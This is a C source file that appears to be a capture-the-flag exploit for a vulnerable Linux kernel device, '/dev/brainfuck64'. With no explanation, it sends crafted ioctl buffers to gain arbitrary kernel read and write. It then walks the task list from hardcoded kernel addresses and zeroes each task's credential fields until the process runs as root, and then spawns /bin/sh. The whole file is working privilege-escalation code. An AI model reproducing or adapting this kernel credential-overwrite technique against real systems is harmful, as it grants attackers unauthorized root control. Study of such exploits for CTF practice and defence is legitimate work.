#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
int fd,fdx;

uint64_t data[0x80];
char code[500];

uint64_t read_from_kernel(uint64_t addr){
	memset(code,0,500);
	*(uint64_t*)&code[0x60] = 0x0000000000000000; 
	*(uint64_t*)&code[0x68] = 0xffffffffa00023c0;
	*(uint64_t*)&code[0x70] = 0x0000000034364642;
	*(uint64_t*)&code[0x78] = 0x0000000000000008;
        *(uint64_t*)&code[0x80] = 0xffffffffa0002350;
	*(uint64_t*)&code[0x88] = addr;
	uint64_t ret = 0;
	ioctl(fd,0xbaadc0d3,code);	
	ioctl(fd,0xd00dc0d3,&ret);
	return ret;
}
void write_to_kernel(uint64_t addr,uint64_t val){
	memset(code,0,500);
	*(uint64_t*)&code[0x60] = 0x0000000000000000; 
	*(uint64_t*)&code[0x68] = 0xffffffffa00023c0;
	*(uint64_t*)&code[0x70] = 0x0000000034364642;
	*(uint64_t*)&code[0x78] = 0x0000000000000008;
        *(uint64_t*)&code[0x80] = 0xffffffffa0002350;
	*(uint64_t*)&code[0x88] = addr;
	code[0] = 0x5e;
	*(uint64_t*)&code[0x1] = val;
	ioctl(fd,0xbaadc0d3,code);
}


int main(){
	int tmp;
	fd = open("/dev/brainfuck64",O_RDONLY);
	uint64_t arg[2];
	arg[0] = 0x34364642;
	arg[1] = 0x20;
	ioctl(fd,0xAC1DC0D3,arg);
	ioctl(fd,0xD00DC0D3,data);
	memset(code,0x3e,0x20);
	code[0x20] = 0x5e;
	*(uint64_t*)&code[0x21] = 0xffffffffa00023b0;
	code[0x29] = 0;
	ioctl(fd,0xBAADC0D3,code);
	ioctl(fd,0xAC1DC0D3,arg);
	memset(code,0x3e,0x10);

	code[0x10] = 0x5e;
        *(uint64_t*)&code[0x11] = 0x34364642;
	code[0x19] = 0x5e;
        *(uint64_t*)&code[0x1a] = 0x8;
	code[0x22] = 0x5e;
	*(uint64_t*)&code[0x23] = 0xffffffffa0002350;
        code[0x2b] = 0x5e;
        *(uint64_t*)&code[0x2c] = 0xffffffffa0002350;
	memset(code+0x34,0x3c,0x28);
	code[0x5c] = 0x5e;
	*(uint64_t*)&code[0x5d] = 0xffffffffa00023c0;
	ioctl(fd,0xBAADC0D3,code);

	uint64_t task = read_from_kernel(0xffffffff81a1b698);
	while(1){
		uint64_t cred = read_from_kernel(task+0x1f0);
		for(int i=0;i<4;i++)
			write_to_kernel(cred+i*8,0);
		if( getuid() == 0)
			system("/bin/sh");
		task = read_from_kernel(task+8);
	}

	read(0,&tmp,sizeof(tmp));
	





}
